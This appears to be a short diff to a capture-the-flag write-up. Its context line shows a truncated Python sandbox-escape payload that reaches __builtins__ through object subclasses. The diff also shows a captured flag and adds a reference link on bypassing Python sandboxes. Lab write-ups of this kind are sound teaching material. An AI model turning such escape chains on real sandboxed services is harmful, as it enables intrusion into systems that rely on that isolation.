@@ -14,3 +14,5 @@ print(().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__i
 ![image](result2.png)
 
 **FLAG:** `acdfCTF{35c4p3_pl4n_1337_w0rk3d_y35!!}`
+
+**Reference**: https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes
